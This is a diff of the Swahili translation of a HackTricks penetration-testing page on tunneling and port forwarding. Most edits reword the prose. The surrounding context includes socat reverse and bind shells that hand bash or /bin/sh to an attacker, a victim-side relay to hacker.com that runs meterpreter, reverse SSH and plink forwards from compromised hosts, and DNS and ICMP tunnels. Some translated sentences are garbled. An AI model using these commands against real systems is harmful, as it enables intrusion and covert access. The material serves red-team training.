@@ -4,17 +4,17 @@
 
 <summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionekana kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionekana kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-**Kikundi cha Usalama cha Kujitahidi Kwa Bidii**
+**Kikundi cha Usalama cha Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -23,7 +23,7 @@
 ## Sawa ya Nmap
 
 {% hint style="warning" %}
-Uchunguzi wa **ICMP** na **SYN** hauwezi kuchimbwa kupitia proksi za socks, hivyo tunapaswa **kulemaza ugunduzi wa ping** (`-Pn`) na kutaja **uchunguzi wa TCP** (`-sT`) ili hii ifanye kazi.
+**ICMP** na uchunguzi wa **SYN** hauwezi kuchimbwa kupitia proksi za socks, hivyo lazima **zimezwe ugunduzi wa ping** (`-Pn`) na tueleze **uchunguzi wa TCP** (`-sT`) ili hii ifanye kazi.
 {% endhint %}
 
 ## **Bash**
@@ -46,13 +46,13 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-Unganisho la picha la SSH (X)
+Unganishaji wa picha wa SSH (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### Bandari ya Mitaani kwenda Bandari
+### Port ya Mitaani kwenda Port nyingine
 
-Fungua Bandari Mpya kwenye Seva ya SSH --> Bandari Nyingine
+Fungua Port mpya kwenye Seva ya SSH --> Port nyingine
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -70,13 +70,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Port ya Mwenyeji --> Mwenyeji Aliyodhuriwa (SSH) --> Mahali Popote
+Port ya Mwenyeji --> Mwenyeji Aliyodhurika (SSH) --> Mahali Popote
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Kusonga Porti Nyuma
+### Kusonga Mbele ya Port
 
-Hii ni muhimu kupata mabua ya nyuma kutoka kwa mwenyeji wa ndani kupitia eneo la DMZ hadi kwa mwenyeji wako:
+Hii ni muhimu kupata mabakuli ya kurudi kutoka kwa wenyeji wa ndani kupitia eneo la DMZ hadi kwa mwenyeji wako:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
@@ -87,7 +87,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-Unahitaji **root kwenye vifaa vyote** (kwa kuwa utaunda interfaces mpya) na sshd config inapaswa kuruhusu kuingia kama root:\
+Unahitaji **root kwenye vifaa vyote** (kwa kuwa utaunda interfaces mpya) na sshd config lazima iruhusu kuingia kama root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -97,7 +97,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Washa uhamishaji upande wa Seva
+Washa uhamishaji upande wa Server
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -108,13 +108,13 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Unaweza **kutumia kivukio** kupitia **ssh** kusafirisha **trafiki yote** kwenye **mtandao wa sehemu** kupitia mwenyeji.\
-Kwa mfano, kusafirisha trafiki yote inayoelekea kwenye 10.10.10.0/24
+Unaweza **kutumia kivukio** kupitia **ssh** trafiki yote kwenda kwenye **mtandao wa sehemu** kupitia mwenyeji.\
+Kwa mfano, kusafirisha trafiki yote inayokwenda kwa 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-unganisha kwa ufunguo wa kibinafsi
+unganishe kwa ufunguo binafsi
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -123,14 +123,14 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Port ya ndani --> Host iliyovamiwa (kikao cha aktive) --> Sanduku la tatu:Port
+Port ya ndani --> Host iliyoharibiwa (kikao cha aktive) --> Sanduku la tatu:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS ni itifaki inayotumiwa kwa kusudi la kusafirisha trafiki ya mtandao kati ya seva na mteja, ikiruhusu mteja kupitisha trafiki yake kupitia seva ya proxy. Itifaki hii inaweza kutumika kwa njia ya tunneling na port forwarding kwa kusudi la kuficha mahali halisi la mteja au kuvuka vizuizi vya mtandao.
+SOCKS ni itifaki inayotumiwa kwa kawaida kwa kuficha trafiki ya mtandao. Inaweza kutumika kama njia ya kuvuka kizuizi cha mtandao au kufikia rasilimali zilizozuiliwa. SOCKS inaweza pia kutumika kama seva ya mtoaji wa huduma ya mtandao (ISP) kwa kusaidia watumiaji kufikia mtandao kwa njia isiyojulikana.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -155,7 +155,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Fungua kituo cha bandari kwenye timu ya seva inayosikiliza kwenye interface zote ambazo zinaweza kutumika kusafirisha trafiki kupitia kwa beacon.
+Fungua kituo cha kusikiliza katika timu inayosikiliza kwenye interface zote ambazo zinaweza kutumika kusafirisha trafiki kupitia beacon.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -166,16 +166,16 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-Katika kesi hii, **bandari inafunguliwa kwenye mwenyeji wa ishara**, sio kwenye Seva ya Timu na trafiki inatumwa kwenye Seva ya Timu na kutoka hapo kwenda kwa mwenyeji:bandari ulioonyeshwa
+Katika kesi hii, **bandari inafunguliwa kwenye mwenyeji wa ishara**, si kwenye Seva ya Timu na trafiki inatumwa kwenye Seva ya Timu na kutoka hapo kwenda kwa mwenyeji:bandari uliyotajwa
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-### rPort2Port ya ndani
+### rPort2Port local
 
 {% hint style="warning" %}
-Katika kesi hii, **bandari inafunguliwa kwenye mwenyeji wa beacon**, sio kwenye Seva ya Timu na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Seva ya Timu) na kutoka hapo kwenda kwa mwenyeji:bandari uliyotajwa
+Katika kesi hii, **bandari inafunguliwa kwenye mwenyeji wa beacon**, sio kwenye Seva ya Timu na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Seva ya Timu) na kutoka hapo kwenda kwa mwenyeji: bandari iliyotajwa
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -239,6 +239,8 @@ victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
 ### Reverse shell
+
+### Kitanzi cha Nyuma
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -249,7 +251,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### Port2Port kupitia soksi
+### Port2Port kupitia socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -263,7 +265,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Unaweza kuzunguka **proxy isiyo na uthibitisho** kwa kutekeleza mstari huu badala ya wa mwisho kwenye konsoli ya mhanga:
+Unaweza kuzunguka **proxy isiyo na uthibitisho** kwa kutekeleza mstari huu badala ya wa mwisho kwenye konsoli ya mwathiriwa:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -271,7 +273,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### Tuneli ya SSL ya Socat
 
-**Konsoli ya /bin/sh**
+**/bin/sh konsoli**
 
 Unda vyeti pande zote mbili: Mteja na Seva
 ```bash
@@ -287,9 +289,9 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-### Port2Port ya Mbali
+### Kijia cha Mbali hadi Kijia
 
-unganisha bandari ya SSH ya ndani (22) kwenye bandari ya 443 ya mwenyeji wa mshambuliaji
+unganisha kijia cha SSH cha eneo (22) kwa kijia cha 443 cha mwenyeji wa mshambuliaji
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -297,9 +299,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Ni kama toleo la konsoli la PuTTY (chaguo zake ni sawa sana na mteja wa ssh).
+Ni kama toleo la kawaida la PuTTY (chaguo zake ni sawa na mteja wa ssh).
 
-Kwa kuwa binary hii itatekelezwa kwa mhanga na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na uunganisho wa nyuma. Kisha, kusonga bandari inayopatikana kwa urahisi tu kwenda kwa bandari kwenye mashine yetu:
+Kwa kuwa faili hii itatekelezwa kwenye kifaa cha mwathiriwa na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kupata uhusiano wa kurudi. Kisha, kusogeza bandari inayopatikana kwa urahisi tu kwenda kwenye bandari kwenye kifaa chetu:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -308,7 +310,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-Unahitaji kuwa mtawala wa eneo (kwa bandari yoyote)
+Unahitaji kuwa mtawala wa ndani (kwa bandari yoyote)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -331,9 +333,9 @@ Kwenye kompyuta yako ya mteja pakia **`SocksOverRDP-Plugin.dll`** kama hivi:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Sasa tunaweza **kuunganisha** kwa **muhanga** kupitia **RDP** kutumia **`mstsc.exe`**, na tunapaswa kupokea **kitufe** kikisema kuwa **programu-jalizi ya SocksOverRDP imeanzishwa**, na itakuwa **ikisikiliza** kwenye **127.0.0.1:1080**.
+Sasa tunaweza **kuunganisha** kwa **muhanga** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kituoni** kusema kwamba **programu-jalizi ya SocksOverRDP imeanzishwa**, na itakuwa **kisikilize** kwenye **127.0.0.1:1080**.
 
-**Ungezea** kupitia **RDP** na kupakia & kutekeleza kwenye mashine ya muhanga `SocksOverRDP-Server.exe` binary:
+**Unge** kupitia **RDP** na kupakia & tekeleza kwenye mashine ya muhanga faili ya `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -341,17 +343,17 @@ Sasa, hakikisha kwenye mashine yako (mshambuliaji) kwamba bandari 1080 inasikili
 ```
 netstat -antb | findstr 1080
 ```
-Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupitia trafiki hiyo kupitia bandari hiyo.**
+Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupitia bandari hiyo.**
 
 ## Proxify Programu za Windows GUI
 
-Unaweza kufanya programu za Windows GUI zinazotembea kupitia proksi kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
+Unaweza kufanya programu za Windows GUI zinavyoendelea kupitia proxi kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
 Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
-Katika **Profile -> Proxification Rules** ongeza jina la programu ya kufanya proksi na uhusiano kwa IPs unazotaka kufanya proksi.
+Katika **Profile -> Proxification Rules** ongeza jina la programu ya kufanywa proxi na uhusiano kwa IPs unazotaka kufanywa proxi.
 
-## Kupuuza proksi ya NTLM
+## Kupuuza proxi ya NTLM
 
-Zana iliyotajwa hapo awali: **Rpivot**\
+Zana iliyotajwa awali: **Rpivot**\
 **OpenVPN** pia inaweza kuipuuza, kwa kuweka chaguo hizi katika faili ya usanidi:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
@@ -360,8 +362,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Inathibitisha dhidi ya proxi na kufunga bandari kwa upande wa ndani ambayo inaelekezwa kwa huduma ya nje unayotaja. Kisha, unaweza kutumia chombo unachopendelea kupitia bandari hii.\
-Kwa mfano, inaweza kuendesha bandari 443.
+Inathibitisha dhidi ya proxi na kubana bandari kwa upande wa ndani ambayo inaelekezwa kwa huduma ya nje unayotaja. Kisha, unaweza kutumia chombo unachopendelea kupitia bandari hii.\
+Kwa mfano, hufanya mbele bandari 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -369,7 +371,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sasa, ikiwa unaweka kwa mfano kwenye mhanga huduma ya **SSH** kusikiliza kwenye bandari 443. Unaweza kuunganisha kupitia bandari ya 2222 ya mshambuliaji.\
+Sasa, ikiwa weka kwa mfano kwa muhanga huduma ya **SSH** kusikiliza kwenye bandari 443. Unaweza kuunganisha kupitia bandari 2222 ya mshambuliaji.\
 Unaweza pia kutumia **meterpreter** inayounganisha kwa localhost:443 na mshambuliaji anasikiliza kwenye bandari 2222.
 
 ## YARP
@@ -382,13 +384,13 @@ Proksi ya nyuma iliyoundwa na Microsoft. Unaweza kuipata hapa: [https://github.c
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root inahitajika kwenye mifumo yote kujenga viunganishi vya tun na kufanya data ya mtaro kati yao kutumia matakwa ya DNS.
+Root inahitajika kwenye mifumo yote kujenga viunganishi vya tun na kufanya data kati yao kutumia matakwa ya DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tunnel itakuwa polepole sana. Unaweza kuunda uhusiano wa SSH uliopimwa kupitia handaki hili kwa kutumia:
+Tunnel itakuwa polepole sana. Unaweza kuunda uhusiano wa SSH uliopunguzwa kupitia handaki hili kwa kutumia:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -419,20 +421,20 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Badilisha DNS ya proxychains
 
-Proxychains inakamata wito wa libc wa `gethostbyname` na kufanya ombi la DNS la tcp kupitia proksi ya socks. Kwa **chaguo-msingi** serveri ya **DNS** ambayo proxychains hutumia ni **4.2.2.2** (imeandikwa kikamilifu). Ili kubadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika mazingira ya **Windows** unaweza kuweka IP ya **domain controller**.
+Proxychains inakamata wito wa libc wa `gethostbyname` na kufanya ombi la tcp DNS kupitia proxy ya socks. Kwa **default** server ya **DNS** ambayo proxychains hutumia ni **4.2.2.2** (imeandikwa kikamilifu). Ili kubadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika mazingira ya **Windows** unaweza kuweka IP ya **domain controller**.
 
 ## Mita Mita katika Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## Tunnels ya ICMP
+## Mita ya ICMP
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Mizizi inahitajika katika mifumo yote miwili ili kuunda viunganishi vya tun na kutuma data kati yao kwa kutumia maombi ya ping ya ICMP.
+Root inahitajika katika mifumo yote kujenga viunganishi vya tun na kufanya data ya tun kati yao kutumia maombi ya ping ya ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -475,7 +477,7 @@ chmod a+x ./ngrok
 
 *Pia niwezekana kuongeza uthibitisho na TLS, ikiwa ni lazima.*
 
-#### Kufanya Barabara ya TCP
+#### Kuchimba Barabara ya TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -493,7 +495,7 @@ chmod a+x ./ngrok
 *Inatumika kwa XSS, SSRF, SSTI ...*
 Moja kwa moja kutoka kwa stdout au kwenye kiolesura cha HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Kutunelisha huduma ya ndani ya HTTP
+#### Kupitisha huduma ya ndani ya HTTP
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -504,7 +506,7 @@ Moja kwa moja kutoka kwa stdout au kwenye kiolesura cha HTTP [http://127.0.0.1:4
 
 Inafungua njia 3:
 - 2 TCP
-- 1 HTTP na ufunuo wa faili za static kutoka /tmp/httpbin/
+- 1 HTTP na ufunuo wa faili za tuli kutoka /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -524,7 +526,7 @@ addr: file:///tmp/httpbin/
 
 **Kikundi cha Usalama cha Kujitahidi**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -532,12 +534,12 @@ addr: file:///tmp/httpbin/
 
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 * Je! Unafanya kazi katika **kampuni ya usalama wa mtandao**? Je! Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
